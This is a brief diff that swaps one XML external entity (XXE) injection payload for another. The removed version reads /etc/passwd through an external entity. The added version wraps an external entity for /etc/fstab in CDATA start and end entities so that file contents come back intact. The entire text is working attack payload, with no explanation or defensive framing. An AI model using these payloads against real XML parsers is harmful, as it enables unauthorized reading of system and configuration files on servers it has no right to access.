@@ -1,8 +1,8 @@
-<!DOCTYPE foo [
-  <!ELEMENT foo ANY>
-  <!ENTITY bar SYSTEM
-  "file:///etc/passwd">;
+<!DOCTYPE data [
+  <!ENTITY start "<![CDATA[">
+  <!ENTITY file SYSTEM 
+"file:///etc/fstab">
+  <!ENTITY end "]]>">
+  <!ENTITY all "&start;&file;&end;">
 ]>
-<foo>
-  &bar;
-</foo>
+<data>&all;</data>
